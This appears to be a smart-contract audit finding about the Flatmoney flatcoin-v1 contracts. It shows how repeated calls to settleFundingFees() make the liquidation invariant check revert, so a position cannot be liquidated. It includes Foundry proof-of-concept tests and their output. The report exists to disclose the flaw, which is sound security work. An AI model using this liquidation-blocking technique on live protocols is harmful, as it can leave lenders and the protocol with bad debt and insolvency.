Colossal Tan Chameleon

high

# User can abuse of settleFundingFees method to prevent being liquidated

## Summary
User can abuse of `settleFundingFees()` method to prevent being liquidated

## Vulnerability Detail

1. When Alice faced liquidation，and Liquidators can liquidate Alice`s position.

2. Alice  call  `settleFundingFees()` method repeatedly. 
 https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/FlatcoinVault.sol#L216

3. Liquidators calls` liquidate() `method ，meanwhile` perform invariant checks on order liquidation`
 https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/LiquidationModule.sol#L85

https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/misc/InvariantChecks.sol#L56
```solidity
function liquidate(uint256 tokenId) public nonReentrant whenNotPaused liquidationInvariantChecks(vault, tokenId)
```


4. Because of Alice abuse of `settleFundingFees() ` method，the value of `marginDepositedTotal ` has changed  ,and therefore `collateralBalance < trackedCollateral`,  `_getCollateralNet()` method revert.
https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/misc/InvariantChecks.sol#L97
```solidity
uint256 collateralBalance = vault.collateral().balanceOf(address(vault));
        uint256 trackedCollateral = vault.stableCollateralTotal() + vault.getGlobalPositions().marginDepositedTotal;

        if (collateralBalance < trackedCollateral) revert FlatcoinErrors.InvariantViolation("collateralNet");
```

poc

1. Under normal circumstances
```solidity

 function test_poc_liquidation() public{
        setWethPrice(1000e8);

        uint256 tokenId = announceAndExecuteDepositAndLeverageOpen({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: 100e18,
            margin: 50e18,
            additionalSize: 120e18,
            oraclePrice: 1000e8,
            keeperFeeAmount: 0
        });

          uint256 tokenId1 = announceAndExecuteDepositAndLeverageOpen({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: 100e18,
            margin: 50e18,
            additionalSize: 120e18,
            oraclePrice: 1000e8,
            keeperFeeAmount: 0
        });

            uint256 tokenId2 = announceAndExecuteDepositAndLeverageOpen({
            traderAccount: bob,
            keeperAccount: keeper,
            depositAmount: 100e18,
            margin: 50e18,
            additionalSize: 100e18,
            oraclePrice: 1000e8,
            keeperFeeAmount: 0
        });
        
        
        vm.startPrank(admin);
        vaultProxy.setMaxFundingVelocity(0.006e18);
        vaultProxy.setMaxVelocitySkew(0.2e18);

      
        skip(15 days);
        
         

         uint256 liqPrice = liquidationModProxy.liquidationPrice(tokenId);
         console2.log(liqPrice);

        //assertGt(liqPrice / 1e10, 1000e8, "Liquidation price should be greater than entry price");

        // Note: We are taking a margin of error here of $1 because of the approximation issues in the liquidation price.
        setWethPrice((liqPrice - 1e18) / 1e10);
        uint256 newCollateralPrice = (liqPrice - 1e18) / 1e10;

         FlatcoinStructs.PositionSummary memory alicePositionSummary1 = leverageModProxy.getPositionSummary(tokenId);
        int256 remainingMargin = alicePositionSummary1.marginAfterSettlement;
        int256 profitLoss = alicePositionSummary1.profitLoss;
        console2.log('alice profitLoss:',profitLoss);

        vm.startPrank(liquidator);
        liquidationModProxy.liquidate(tokenId);
    }

[PASS] test_poc_liquidation() (gas: 4199741)
Logs:
  1040763226366001604622
  alice profitLoss: 4589109368586113687

Test result: ok. 1 passed; 0 failed; finished in 28.20ms

```

2 . Attack scenario，Alice abuse of `settleFundingFees` method to prevent being liquidated
```solidity
  
    function test_poc_liquidation() public{
        setWethPrice(1000e8);

        uint256 tokenId = announceAndExecuteDepositAndLeverageOpen({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: 100e18,
            margin: 50e18,
            additionalSize: 120e18,
            oraclePrice: 1000e8,
            keeperFeeAmount: 0
        });

          uint256 tokenId1 = announceAndExecuteDepositAndLeverageOpen({
            traderAccount: alice,
            keeperAccount: keeper,
            depositAmount: 100e18,
            margin: 50e18,
            additionalSize: 120e18,
            oraclePrice: 1000e8,
            keeperFeeAmount: 0
        });

            uint256 tokenId2 = announceAndExecuteDepositAndLeverageOpen({
            traderAccount: bob,
            keeperAccount: keeper,
            depositAmount: 100e18,
            margin: 50e18,
            additionalSize: 100e18,
            oraclePrice: 1000e8,
            keeperFeeAmount: 0
        });
        
        
        vm.startPrank(admin);
        vaultProxy.setMaxFundingVelocity(0.006e18);
        vaultProxy.setMaxVelocitySkew(0.2e18);

        skip(15 days);
        
         uint256 liqPrice = liquidationModProxy.liquidationPrice(tokenId);
         console2.log(liqPrice);

        //assertGt(liqPrice / 1e10, 1000e8, "Liquidation price should be greater than entry price");

        // Note: We are taking a margin of error here of $1 because of the approximation issues in the liquidation price.
        setWethPrice((liqPrice - 1e18) / 1e10);
        uint256 newCollateralPrice = (liqPrice - 1e18) / 1e10;
       
        /***************************************************************/
        vm.startPrank(alice);
        vaultProxy.settleFundingFees();
        
        vaultProxy.settleFundingFees();
/***************************************************************/
       

         FlatcoinStructs.PositionSummary memory alicePositionSummary1 = leverageModProxy.getPositionSummary(tokenId);
        int256 remainingMargin = alicePositionSummary1.marginAfterSettlement;
        int256 profitLoss = alicePositionSummary1.profitLoss;
        console2.log('alice profitLoss:',profitLoss);

        vm.startPrank(liquidator);
        liquidationModProxy.liquidate(tokenId);
    }

[FAIL. Reason: InvariantViolation(collateralNet)] test_poc_liquidation() (gas: 5021853)

```


## Impact
Certain  positions will never be eligible for liquidation and hence protocol   may be left with bad debt. potentially leading to insolvency if the bad debts accumulate.

## Code Snippet
https://github.com/sherlock-audit/2023-12-flatmoney/blob/bba4f077a64f43fbd565f8983388d0e985cb85db/flatcoin-v1/src/misc/InvariantChecks.sol#L93

## Tool used

Manual Review

## Recommendation
limit the use of `settleFundingFees()` method,to implement  access control
